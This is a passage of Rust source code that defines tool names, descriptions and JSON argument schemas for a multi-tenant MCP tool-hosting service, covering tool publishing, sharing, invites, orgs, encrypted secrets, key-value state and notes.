                    "until": {"type": ["string", "integer"], "description": "Window end, same forms (default now)."},
                    "key_label": {"type": "string", "description": "Only calls made with the sub-key labelled so."},
                    "tool": {"type": "string", "description": "Only calls to this tool."},
                    "outcome": {"type": "string", "description": "Only calls with this outcome (ok, error, refused, ...)."},
                    "credential": {"type": "string", "enum": crate::calllog::Credential::ALL.iter().map(|c| c.as_str()).collect::<Vec<_>>(), "description": "Only calls made with this credential kind."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-call-audit-export R3.
        Tool::new(
            "host.calls.export",
            "Export the calls made with this tenant's keys in a window as CSV (the host.calls.list \
             columns, newest first), with its sha256 and an ES256 signature over the CSV bytes: \
             verify with the JWK named by kid at /.well-known/jwks.json. Primary key only.",
            host_schema(
                json!({
                    "since": {"type": ["string", "integer"], "description": "Window start: \"-24h\", \"-30d\", a YYYY-MM-DD day, an RFC 3339 instant or Unix epoch seconds (default -24h)."},
                    "until": {"type": ["string", "integer"], "description": "Window end, same forms (default now)."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-key-delegate-child-keys R2.
        Tool::new(
            "host.key.delegate",
            "Mint a child key that can do strictly less than yours: scopes, tools and lifetime are \
             subsets of your own, depth at most 3. Asking for more fails scope_escalation naming \
             the first excess item. Needs can_delegate (the primary always has it). Returns the \
             key once.",
            host_schema_any(
                json!({
                    "scopes": {
                        "type": "array",
                        "items": {"type": "string", "enum": crate::scopes::all_names()},
                        "minItems": 1,
                        "description": "Scopes the child holds; each must be implied by yours (default mcp when bind is given).",
                    },
                    "tools": {
                        "type": "array",
                        "items": {"type": "string"},
                        "minItems": 1,
                        "maxItems": 64,
                        "description": "Tool allowlist, a subset of yours (default: yours).",
                    },
                    "ttl_s": {
                        "type": "integer",
                        "minimum": 60,
                        "description": "Lifetime in seconds; at most your own remaining lifetime and the plan's delegated_ttl_max_s (required unless bind is given; then the run's deadline or the plan ceiling).",
                    },
                    "label": {
                        "type": "string",
                        "description": "Name for host.key.revoke / host.key.list; unique per tenant (default: generated).",
                    },
                    "can_delegate": {
                        "type": "boolean",
                        "description": "Whether the child may itself delegate (default false).",
                    },
                    "bind": {
                        "type": "object",
                        "description": "Tie the child to one unit of work: {run_id} (an open run of yours; the key dies with it and expires no later than its deadline) or {session: \"current\"} / {session_id} (this connection; the key dies when it closes or sits idle 30 min). Refused key_bound_elsewhere anywhere else.",
                    },
                }),
                &[],
                &["scopes", "bind"],
            ),
        ),
        // PRD-mcphost-tenant-self-offboard P0 requirement 1 / AC1-4:
        // authenticated like every other host.* tenant tool -- host_schema's
        // tenant_key property is exactly the credential being retired here.
        // No admin key, no operator ticket: the same channel a tenant
        // signed up through is the one it leaves through.
        Tool::new(
            "host.self.offboard",
            "Permanently close your own account: disables the tenant, cancels any active \
             Stripe subscription (pro plan), and stops your key from authenticating anything \
             further -- same as an admin-disabled tenant. Idempotent: a repeat call by an \
             already-offboarded key returns {disabled: true, already_offboarded: true}, not an \
             error; every other host.*/billing.* call still gets tenant_disabled/tenant_key_invalid. This does not scrub historical \
             usage/signup records -- those stay for audit, same as today's admin-disabled \
             tenants.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.tool.publish",
            tool_publish_description(kinds),
            tool_publish_schema(kinds, true),
        ),
        Tool::new(
            "host.quickstart",
            "Return the shortest ordered sequence of calls to a working tool of `kind`, \
             with your namespace and a filled-in example already substituted in, plus the \
             current limits and a try_before_call table naming the one dry-run tool for \
             each case. Read-only -- this call alone never creates a tenant. Call this \
             before host.tool_publish if you're not sure what a spec should look like. \
             Unauthenticated callers get a worked example with no tenant data; any other \
             host.*/billing.* call creates a tenant on first use, no signup required.",
            host_schema(
                json!({
                    "kind": {
                        "type": "string",
                        "description": "Which registered kind to return a worked example for, \
                            e.g. echo, http, python -- or a job-word alias (webhook, event, \
                            cron, ...) for its recipe. Omit to see every kind, alias and \
                            recipe name.",
                    },
                    "retry_after_s": {
                        "type": "integer",
                        "description": "Seconds a rate-limited signup said to wait; an error's \
                            next_call carries it back here. Informational, never required.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.help.search",
            crate::help_search::TOOL_DESCRIPTION,
            host_schema(crate::help_search::schema_properties(kinds), &["q"]),
        ),
        Tool::new(
            "host.errors",
            crate::error_registry::TOOL_DESCRIPTION,
            host_schema(crate::error_registry::schema_properties(), &[]),
        ),
        Tool::new(
            "host.help.get",
            crate::doc_anchors::HELP_GET_DESCRIPTION,
            host_schema(crate::doc_anchors::help_get_schema_properties(), &["anchor"]),
        ),
        Tool::new(
            "host.tool.list",
            "List this tenant's published tools. fields projects each row to the named keys; \
             limit returns only the first N tools (truncated: true when more exist).",
            host_schema(
                json!({
                    "limit": {
                        "type": "integer", "minimum": 1, "maximum": 1000,
                        "description": "Return only the first N tools; default all.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.tool.remove",
            "Remove a published tool by its local name.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool to remove."},
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.tool.logs",
            "Return the most recent log lines for one of this tenant's tools.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Local name of the tool whose log lines to return.",
                    },
                    "limit": {
                        "type": "integer",
                        "description": "Max lines to return, most recent first; default 20.",
                    },
                }),
                &["name"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_02() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.tool.test",
            TOOL_TEST_DESC,
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Local name of the already-published tool to dry-run.",
                    },
                    "args": {
                        "type": "object",
                        "description": "Arguments to pass, same shape as a real call. Omit to run one \
                            example generated from the tool's args_schema; the response then carries \
                            example_args (what ran) and untyped (keys the schema gave no type for).",
                    },
                    "fixtures": {
                        "type": "object",
                        "description": "Chain tools only: {\"<step number or tool name>\": <recorded result>}. A \
                            fixtured step executes nothing (no upstream call); later mappings resolve \
                            against it. host.runs.get(run_id, as_fixtures=true) exports a real run in this shape.",
                    },
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.bridge.test",
            BRIDGE_TEST_DESC,
            host_schema(
                json!({
                    "spec": {
                        "type": "object",
                        "description": "An http-kind spec, not yet published, e.g. \
                            {\"url\": \"https://api.example.com/items/{{id}}\", \"method\": \"GET\"}.",
                    },
                    "args": {
                        "type": "object",
                        "description": "Arguments to render into the spec, same shape as a real call.",
                    },
                }),
                &["spec", "args"],
            ),
        ),
        Tool::new(
            "host.tool.run",
            TOOL_RUN_DESC,
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Local name of the already-published python tool to debug-run.",
                    },
                    "args": {
                        "type": "object",
                        "description": "Arguments to pass, same shape as a real call.",
                    },
                    "test": {
                        "type": "boolean",
                        "description": "PRD-mcphost-dry-run-side-effects: run with writes rolled back and \
                            reported under dry_run, nothing delivered; default false (a real debug run).",
                    },
                }),
                &["name", "args"],
            ),
        ),
        Tool::new(
            "host.tool.call",
            "Invoke a tool this tenant has already published, by its local name -- the \
             same real, metered call as calling it directly by its namespaced name \
             (<namespace>.<name>), for a session that has no way to see its own \
             namespaced tool name yet. Unlike host.tool_test, this counts toward \
             host.usage and appears in host.tool_logs. Pass async: true for a tool \
             that needs more than the call deadline: returns {run_id, status: \"queued\"} \
             immediately instead of running inline -- see host.runs.get/wait. Pass \
             version to pin the call to one of host.tool_history's versions instead of \
             whichever is current.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool to invoke."},
                    "args": {
                        "type": "object",
                        "description": "Arguments to pass, validated against the tool's own args_schema.",
                    },
                    "async": {
                        "type": "boolean",
                        "description": "Run as a job instead of inline: returns {run_id, status} \
                            within ~50ms under the plan's job_max_s deadline; default false.",
                    },
                    "version": {
                        "type": "integer",
                        "description": "Pin the call to this version instead of whichever is \
                            current; see host.tool_history. An unknown version is an argument error.",
                    },
                    "budget": {
                        "type": "object",
                        "description": "Lowers this call's budget below the plan default: any \
                            subset of max_child_calls, max_est_tokens, max_tool_latency_ms, \
                            max_wall_ms. A value above the plan's own ceiling is a validation \
                            error naming it; see host.runs.get's progress.budget.",
                        "properties": crate::plans::Plan::budget_schema_properties(
                            &crate::plans::PlanCatalog::default_catalog(),
                        ),
                    },
                    "dry_run": {
                        "type": "boolean",
                        "description": "Ask instead of call: runs every admission check the real \
                            call runs, dispatches nothing, writes no call row, and returns \
                            {fits, units, remaining, refusal}; same as host.estimate. Default false.",
                    },
                }),
                &["name"],
            ),
        ),
        // PRD-mcphost-tool-versions P0 requirements 3/4, P2 requirement 8:
        // every publish is a new, immutable version; these three read/undo
        // that history.
        Tool::new(
            "host.tool.history",
            "List every published version of one of this tenant's tools, newest first, \
             each with its creation time, source_sha256, and whether it's the current one.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool."},
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.tool.rollback",
            "Make an earlier published version of one of this tenant's tools current \
             again -- the next host.tool_call (or namespaced call) runs that version's \
             source. See host.tool_history for the valid version numbers.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool to roll back."},
                    "version": {
                        "type": "integer",
                        "description": "The version number (from host.tool_history) to make current.",
                    },
                }),
                &["name", "version"],
            ),
        ),
        Tool::new(
            "host.tool.diff",
            "Return a unified diff between two published versions of one of this \
             tenant's tools.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool."},
                    "from": {"type": "integer", "description": "The earlier version number."},
                    "to": {"type": "integer", "description": "The later version number."},
                }),
                &["name", "from", "to"],
            ),
        ),
        Tool::new(
            "host.usage",
            "Calls, errors and duration percentiles for this tenant over a window. Pass \
             `by` (\"tool\", \"caller\", or \"end_user\") for a breakdown instead of the \
             plain per-tenant summary: \"caller\" (only valid for a tool this tenant has \
             shared) shows which tenant called in and how much; \"end_user\" shows which \
             identified end user called, with the caller tenant folded into the key when \
             the call crossed tenants. Breakdown rows cap at 1000 per page; pass the \
             returned `cursor` back to page further.",
            host_schema(
                json!({
                    "window": {
                        "type": "string",
                        "description": "Time window to summarize, e.g. \"24h\"/\"1d\"/\"7d\"/\"30d\"; \
                            default 24h (\"1d\" when `by` is given).",
                    },
                    "tool": {
                        "type": "string",
                        "description": "Scope the breakdown to one local tool name. Required when \
                            by is \"caller\".",
                    },
                    "by": {
                        "type": "string",
                        "enum": crate::control::USAGE_BY,
                        "description": "\"tool\", \"caller\", or \"end_user\" -- omit for the plain \
                            per-tenant summary.",
                    },
                    "limit": {
                        "type": "integer",
                        "description": "Max breakdown rows per page (1-1000, default 1000).",
                    },
                    "cursor": {
                        "type": "string",
                        "description": "Resume a breakdown after this page's last key.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-host-tool-deprecation requirement 4 / AC6: what
        // changed in the host.*/billing.* surface itself -- additions,
        // announced deprecations, and completed removals, derived from
        // the same contract dump `mcphost contract dump` writes -- see
        // `api_contract::changelog`.
        Tool::new(
            "host.changelog",
            "List what changed in the host.*/billing.* tool surface -- releases, added \
             tools, renamed tools, deprecations, and removals -- since an optional version \
             (default: the version you last called with). Read-only.",
            host_schema(
                json!({
                    "since": {
                        "type": "string",
                        "description": "Only list changes after this version, e.g. \"0.57.0\", or a \
                            contract_version string from host.whoami. Omit (or \"last_seen\") \
                            for the version you last called with; a tenant never seen gets the \
                            last 5 releases and since: null.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-resume-tool R1: "what was I doing?" in one bounded
        // response -- see `resume.rs`.
        Tool::new(
            "host.resume",
            "Resume where you left off in one call (at most 4096 bytes): your tools with each \
             one's last call status, unfinished runs, your newest notes, what changed on the \
             host since your last call, and one suggested next_call. truncated names any \
             section that was cut -- call that section's own tool (host.tool.list, \
             host.runs.list, host.note.list, host.changelog) for the rest. Read-only. An \
             unauthenticated caller gets the onboarding block and creates no tenant.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-tenant-data-export P0 requirements 1-3: the pair of
        // "leave the way you joined" (host.self_offboard) is "take what you
        // made" -- a background job (see `export.rs`) that archives this
        // tenant's tool sources, state, secret names (never values), runs
        // and threads, downloadable by signed URL for 24h.
        Tool::new(
            "host.export",
            "Build a downloadable .tar.gz of everything this tenant owns: tool sources, \
             state, host.table.* tables (schema + rows), table notes, documents (original \
             bytes), secret NAMES (never values), run/thread history and usage, plus a \
             version-2 manifest.json (sha256 and bytes per entry; its tools list is \
             re-publishable via host.tool_publish). Runs as a background job \
             (poll host.runs.get with the returned run_id) -- calling this again while one is \
             already running returns that same run_id rather than starting a second one. The \
             finished run's result carries a download_url valid 24 hours.",
            host_schema(
                json!({
                    "tools": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Local names of the tools to include; every tool when omitted.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-export-tables-and-import-restore R2: the read half of
        // host.export -- see `import.rs`.
        Tool::new(
            "host.import",
            "Restore a completed host.export of this tenant into an EMPTY tenant: tools (through \
             the host.tool_publish validators), state, host.table.* tables and rows, table notes \
             and documents. Pass run_id (a finished host.export run) or url (its signed download \
             URL). A tenant that already holds a tool, state key, table or document is refused \
             as tenant_not_empty naming what exists; an archive larger than this plan's \
             export_bytes_max is refused as quota_exceeded before anything is written. Secret \
             values are never exported: the result's secrets_to_set names the ones to set again. \
             Runs as a background job (poll host.runs.get: entries_done / entries_total); \
             dry_run: true validates and returns the entry counts and bytes without writing.",
            host_schema_any(
                json!({
                    "run_id": {
                        "type": "string",
                        "description": "Run id of a completed host.export of this tenant.",
                    },
                    "url": {
                        "type": "string",
                        "description": "The signed download_url a host.export result carried.",
                    },
                    "dry_run": {
                        "type": "boolean",
                        "description": "Validate and report entry counts and bytes; write nothing.",
                    },
                }),
                &[],
                &["run_id", "url"],
            ),
        ),
        // PRD-mcphost-sharing P0 requirement 1: a tool can be made
        // `public` (any tenant) or `group` (a named allow-list this
        // tenant owns) -- see `sharing.rs`.
        Tool::new(
            "host.tool.share",
            "Share one of this tenant's published tools with everyone (visibility: \"public\") \
             or with a named group this tenant owns (visibility: \"group\", group: <name>). \
             The tool keeps running in this tenant's own sandbox with this tenant's own \
             secrets; a caller reaches it as <this tenant's namespace>.<name>.",
            host_schema_checked(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool to share."},
                    "visibility": {
                        "type": "string",
                        "enum": crate::sharing::Visibility::schema_enum(&crate::sharing::Visibility::SHAREABLE),
                        "description": "\"public\" (needs a passing dry run of the current version), \
                            \"unlisted\", \"group\" or \"url\".",
                    },
                    "tags": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Catalog tags merged into the tool's existing ones (same rules as host.tool_publish).",
                    },
                    "group": {
                        "type": "string",
                        "description": "Required when visibility is \"group\"; must already exist \
                            (host.group.create).",
                    },
                    "description": {
                        "type": "string",
                        "description": "Catalog-facing blurb; shown by host.catalog.search/get.",
                    },
                    "expose_spec": {
                        "type": "boolean",
                        "description": "Default false. When true, any tenant this tool is shared \
                            with may call host.tool_spec_shared to read its (redacted) spec.",
                    },
                    "scopes": {
                        "type": "array", "minItems": 1,
                        "items": {"type": "string", "enum": crate::sharing::ShareScope::names()},
                        "description": "What the grantee may do: call, read_source, fork. Default \
                            [\"call\"] ([\"call\",\"read_source\"] with expose_spec: true). url \
                            shares allow only call.",
                    },
                    "rate_per_hour_per_caller": {
                        "type": "integer", "minimum": 1, "maximum": crate::sharing::RATE_PER_HOUR_MAX,
                        "description": "Optional cap (1..10000) on calls per hour from any one grantee.",
                    },
                }),
                &["name", "visibility"],
            ),
        ),
        // PRD-mcphost-shared-tool-spec-readback P0 requirement 2: the
        // sharee-side counterpart to expose_spec.
        Tool::new(
            "host.tool.spec_shared",
            "Read a shared tool's kind and redacted spec -- only works when the owner shared it \
             with expose_spec: true. The spec never carries env values or secret references \
             (see host.tool_share's expose_spec).",
            host_schema(
                json!({
                    "tool": {
                        "type": "string",
                        "pattern": crate::sharing::QUALIFIED_NAME_PATTERN,
                        "description": "\"<owner_namespace>.<name>\", the same qualified name \
                            host.tool_call uses for a shared tool.",
                    },
                }),
                &["tool"],
            ),
        ),
        // PRD-mcphost-scoped-tool-share R6: copy a fork-scoped shared tool.
        Tool::new(
            "host.tool.fork",
            "Copy a tool shared with you (scope fork) into your own tenant as a private tool you \
             can edit. The copy records forked_from and counts toward tools_max; the owner's env \
             values are not copied.",
            host_schema(
                json!({
                    "owner": {"type": "string", "description": "The owner's namespace, e.g. t_ab12."},
                    "tool": {"type": "string", "description": "The owner's local tool name."},
                    "as": {"type": "string", "description": "Name for your private copy."},
                }),
                &["owner", "tool", "as"],
            ),
        ),
        Tool::new(
            "host.tool.list_shared",
            "List tools other tenants shared with you: public shares plus group shares you are a \
             member of (group shares also appear in tools/list; public ones never do).",
            host_schema(
                json!({
                    "q": {"type": "string", "description": "Optional substring filter on name/description."},
                    "limit": {"type": "integer", "description": "Max entries (default 50, max 200)."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.tool.unshare",
            "Take a shared tool back to private.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Local name of the tool to unshare."},
                }),
                &["name"],
            ),
        ),
        // PRD-mcphost-shared-tool-caller-usage requirement 3 (AC3): caps on
        // one caller's calls into one of this tenant's shared tools.
        Tool::new(
            "host.share.caller_limit",
            "Cap how many successful calls a caller tenant may make per UTC day into one of \
             this tenant's shared tools. The tool must already be shared. Exceeding the cap \
             fails the call with quota_caller (never runs it); this tenant's own calls to the \
             tool are unaffected.",
            host_schema(
                json!({
                    "tool": {"type": "string", "description": "Local name of the shared tool."},
                    "caller_tenant": {
                        "type": "string",
                        "description": "The caller's namespace to cap.",
                    },
                    "calls_per_day": {
                        "type": "integer", "minimum": 1,
                        "description": "Max successful calls per UTC day for this caller.",
                    },
                }),
                &["tool", "caller_tenant", "calls_per_day"],
            ),
        ),
        Tool::new(
            "host.share.caller_limit_remove",
            "Remove a caller_limit set by host.share.caller_limit.",
            host_schema(
                json!({
                    "tool": {"type": "string", "description": "Local name of the shared tool."},
                    "caller_tenant": {
                        "type": "string",
                        "description": "The caller's namespace whose limit to remove.",
                    },
                }),
                &["tool", "caller_tenant"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_03() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.group.create",
            "Create a named group this tenant owns, for host.tool_share(visibility: \"group\").",
            host_schema(
                json!({"name": {"type": "string", "description": "Group name."}}),
                &["name"],
            ),
        ),
        Tool::new(
            "host.group.add",
            "Add a tenant (by namespace) to a group this tenant owns.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Group name."},
                    "namespace": {"type": "string", "description": "Member tenant's namespace."},
                }),
                &["name", "namespace"],
            ),
        ),
        Tool::new(
            "host.group.remove",
            "Remove a tenant (by namespace) from a group this tenant owns.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Group name."},
                    "namespace": {"type": "string", "description": "Member tenant's namespace."},
                }),
                &["name", "namespace"],
            ),
        ),
        Tool::new(
            "host.group.list",
            "List the groups this tenant owns and their members.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.catalog.search",
            "Search public tools across every tenant by name/description substring.",
            host_schema(
                json!({
                    "q": {"type": "string", "description": "Substring to match; omit for every public tool."},
                    "limit": {"type": "integer", "description": "Max results; default 20."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.catalog.get",
            "Return one public tool's descriptor and args_schema by its full name \
             (<namespace>.<name>).",
            host_schema(
                json!({
                    "full_name": {
                        "type": "string",
                        "description": "The tool's full name, <namespace>.<name>.",
                    }
                }),
                &["full_name"],
            ),
        ),
        // PRD-mcphost-invite-links requirement 1 (AC1): one URL carries
        // tenant creation, contact, and tool visibility.
        Tool::new(
            "host.invite.create",
            "Create an invite link: a friend who connects to the returned url and makes a \
             first host.* call gets a fresh tenant whose contact with you is already accepted \
             and whose listed tools are already shared. The free plan allows 3 live invites \
             at once (host.invite.revoke frees a slot); your own standing invite -- its url \
             is the invite_url field on host.whoami -- never counts against this.",
            host_schema(
                json!({
                    "share": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Local names of your own tools to share with whoever \
                            redeems this invite. Default: none.",
                    },
                    "max_uses": {
                        "type": "integer",
                        "description": "How many tenants this invite may create. Default 10, \
                            maximum 100.",
                    },
                    "expires_in_days": {
                        "type": "integer",
                        "description": "Days until this invite stops working. Default 30, \
                            maximum 365.",
                    },
                    "caller_limit_per_day": {
                        "type": "integer",
                        "description": "Optional calls_per_day cap applied to every invitee \
                            for each shared tool (host.share.caller_limit). Default: no cap.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.invite.list",
            "List every invite you own (standard and your own standing invite), with uses, \
             limits, and the namespaces of everyone who joined through each.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.invite.revoke",
            "Revoke an invite by its code. A standard invite simply stops working (existing \
             invitees keep their tenants and shares). Your standing invite is rotated instead: \
             a fresh invite_url is returned and the old one starts answering invite_invalid.",
            host_schema(
                json!({
                    "code": {"type": "string", "description": "The invite's own code, from \
                        host.invite.create or the invite_url field on host.whoami."},
                }),
                &["code"],
            ),
        ),
        Tool::new(
            "host.org.create",
            "Create an org with you as its owner and get an org invite url \
             (https://<host>/o/<code>/mcp): each teammate who connects to it gets its own \
             tenant, key and url, and joins the org as a member. You can belong to one org.",
            host_schema(
                json!({
                    "name": {"type": "string", "description": "Org name, 3-32 characters: \
                        lowercase letters, digits and single hyphens (^[a-z0-9]+(-[a-z0-9]+)*$)."},
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.org.join",
            "Join an org with the tenant you already have, using the code from its org \
             invite url. Your key, namespace, url and tools are untouched; you become a member.",
            host_schema(
                json!({
                    "code": {"type": "string", "description": "The <code> segment of the \
                        org's /o/<code>/mcp invite url."},
                }),
                &["code"],
            ),
        ),
        Tool::new(
            "host.org.members",
            "List your org's live members (namespace, role, joined_at, last_seen, tool \
             count). The owner's response also carries the org invite_url.",
            host_schema(
                json!({
                    "role": {
                        "type": "string",
                        "enum": crate::org::roles_enum_json(),
                        "description": "Only members with this role. Default: all.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.org.remove",
            "Owner only: end one member's membership in your org. The member keeps its own \
             tenant, key, url and tools; its host.whoami shows org: null from then on.",
            host_schema(
                json!({
                    "member": {"type": "string", "description": "The member's namespace, \
                        from host.org.members."},
                }),
                &["member"],
            ),
        ),
        Tool::new(
            "host.org.leave",
            "Leave your org (members only; the owner gets owner_cannot_leave). You keep \
             your own tenant, key, url and tools; host.whoami shows org: null afterwards.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.org.usage",
            "Per-member and per-tool usage for your org over a window: calls, errors, seconds, \
             state_bytes and est_cost_usd for each member, plus org totals. Figures are the \
             same ones each member's own host.usage reports. A member sees only its own row \
             and the totals.",
            host_schema(
                json!({
                    "window": {"type": "string", "description": "Look-back window such as \
                        24h or 7d (default 7d, at most 90d)."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.org.digest.set",
            "Owner only: opt your org's weekly usage digest email in or out. The digest goes \
             to the verified owner address every Monday 07:00 UTC and is on by default.",
            host_schema(
                json!({
                    "enabled": {"type": "boolean", "description": "true to receive the weekly \
                        digest, false to stop it."},
                }),
                &["enabled"],
            ),
        ),
        Tool::new(
            "host.org.digest.send",
            "Owner only: email the org's 7-day usage digest to the verified owner address now. \
             At most once an hour; a second call answers rate_limited.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.secret.set",
            "Store an encrypted secret value under this tenant's namespace, optionally bound to the hosts it may be sent to.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Secret name, referenced from a spec as secret.<name>.",
                    },
                    "value": {
                        "type": "string",
                        "description": "The secret value; stored AES-256-GCM encrypted, never returned.",
                    },
                    "hosts": {
                        "type": "array",
                        "items": {"type": "string", "pattern": crate::leakguard::HOST_PATTERN},
                        "description": "Hostnames this secret may be sent to (api.example.com, or *.example.com). A call that would send the value to any other host fails secret_leak_blocked. Omit to keep an existing binding; [] clears it.",
                    },
                }),
                &["name", "value"],
            ),
        ),
        Tool::new(
            "host.secret.list",
            "List this tenant's secret names (never their values).",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-secret-non-exfiltration-proof R4.
        Tool::new(
            "host.secret.leak_test",
            "Prove a secret cannot leave: publishes a transient http fixture that tries to \
             echo the secret in a result and to send it to an off-host canary, calls both, \
             removes the fixture, and returns {echo, egress, bound_hosts, checked_at} where each \
             verdict is blocked or LEAKED. LEAKED fails the call with leak_test_failed.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "pattern": crate::leakguard::SECRET_NAME_PATTERN,
                        "description": "The secret to test (host.secret.set).",
                    },
                    "echo_url": {
                        "type": "string",
                        "description": "Optional http(s) URL of an upstream that echoes its request body; the secret is sent there, so it must be bound to that host (or unbound). Omit to use the host's in-process echo.",
                    },
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.registry.publish",
            "Publish this tenant's server.json to the configured MCP registry \
             (requires --registry-url and admin.tenant_verify_namespace first).",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-tenant-state P0 requirement 2: a per-tenant store an
        // agent inspects and seeds from its own session, mirroring the
        // `mcphost.state` module a python tool gets from inside the
        // sandbox (not yet built -- see the crate's `tenant_state.rs`
        // module doc).
        Tool::new(
            "host.state.get",
            "Read one key from this tenant's key-value state namespace. Returns \
             found: false (not an error) if the key was never set.",
            host_schema(
                json!({
                    "key": {
                        "type": "string",
                        "description": "Key to read from this tenant's key-value state namespace.",
                    },
                    "end_user": end_user_arg_schema(),
                }),
                &["key"],
            ),
        ),
        Tool::new(
            "host.state.set",
            "Write one key in this tenant's key-value state namespace; value may be any \
             JSON value. Overrun of the plan's state_bytes_max quota fails with \
             state_quota_exceeded and writes nothing.",
            host_schema(
                json!({
                    "key": {
                        "type": "string",
                        "description": "Key to write in this tenant's key-value state namespace.",
                    },
                    "value": {"type": ANY_JSON_TYPES, "description": "Any JSON value to store under key."},
                    "end_user": end_user_arg_schema(),
                }),
                &["key", "value"],
            ),
        ),
        Tool::new(
            "host.state.delete",
            "Delete one key from this tenant's key-value state namespace.",
            host_schema(
                json!({
                    "key": {
                        "type": "string",
                        "description": "Key to delete from this tenant's key-value state namespace.",
                    },
                    "end_user": end_user_arg_schema(),
                }),
                &["key"],
            ),
        ),
        Tool::new(
            "host.state.list",
            "List keys (with their current values) in this tenant's key-value state \
             namespace, optionally filtered by prefix.",
            host_schema(
                json!({
                    "prefix": {
                        "type": "string",
                        "description": "Only list keys starting with this prefix; default: all keys.",
                    },
                    "limit": {
                        "type": "integer",
                        "description": "Max keys to return; default 100.",
                    },
                    "end_user": end_user_arg_schema(),
                }),
                &[],
            ),
        ),
        // PRD-mcphost-notes-to-future-self R1/R2.
        Tool::new(
            "host.note.put",
            "Leave a note for your next session. With attach_to: {tool: name} the note shows up \
             on that tool's description in every later tools/list (\" — note to self: <text>\", \
             cut to 120 chars), on any client; the server sends tools/list_changed now. \
             Returns {key, attach_to, expires_at, visible_in}. Over the plan's notes_max it \
             fails quota_exceeded {limit, used}; an unknown tool or run fails not_found.",
            host_schema(
                json!({
                    "text": {"type": "string", "minLength": 1, "maxLength": 4096, "description": "The note (at most 4096 bytes)."},
                    "attach_to": {
                        "type": "object",
                        "description": "What the note is about: {tool: <your tool's local name>} or {run: <run id>}.",
                        "properties": {"tool": {"type": "string"}, "run": {"type": "string"}},
                    },
                    "ttl_s": {"type": "integer", "minimum": 60, "maximum": 7776000, "description": "Seconds until the note expires; default: never."},
                }),
                &["text"],
            ),
        ),
        Tool::new(
            "host.note.list",
            "List your live notes, newest first: {notes: [{key, text, attach_to, created_unix, \
             expires_unix}], next_cursor}. Text is returned in full.",
            host_schema(
                json!({
                    "attach_to": {
                        "type": "object",
                        "description": "Only notes attached to this: {tool: name} or {run: id}.",
                        "properties": {"tool": {"type": "string"}, "run": {"type": "string"}},
                    },
                    "limit": {"type": "integer", "minimum": 1, "maximum": 100, "description": "Max notes to return; default 100."},
                    "cursor": {"type": "string", "description": "next_cursor from the previous page."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.note.delete",
            "Delete one note by its key (from host.note.list). Deleting a tool-attached note \
             removes its tools/list suffix and sends tools/list_changed.",
            host_schema(
                json!({"key": {"type": "string", "description": "The note's notes/ key."}}),
                &["key"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_04() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.state.table_create",
            "Declare (or replace the schema of) a table in this tenant's state store. \
             schema is {\"column\": \"text\"|\"integer\"|\"real\"|\"boolean\"|\"json\"}; \
             primary_key, if given, must name one of schema's columns -- an insert whose \
             row matches an existing row's primary_key value replaces it.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Table name to declare, or replace the schema of.",
                    },
                    "schema": {
                        "type": "object",
                        "description": "Column name to type map, each type one of \
                            text|integer|real|boolean|json, e.g. {\"id\": \"integer\"}.",
                    },
                    "primary_key": {
                        "type": "string",
                        "description": "Column name (must be in schema) whose matching value \
                            replaces an existing row on insert; optional.",
                    },
                }),
                &["name", "schema"],
            ),
        ),
        Tool::new(
            "host.state.table_drop",
            "Drop a declared table and every row it holds.",
            host_schema(
                json!({
                    "name": {
                        "type": "string",
                        "description": "Name of the declared table to drop, with every row it holds.",
                    },
                }),
                &["name"],
            ),
        ),
        Tool::new(
            "host.state.insert",
            "Insert one row (an object) or several (an array of objects) into a declared \
             table. Each row is validated against the table's schema first -- a type \
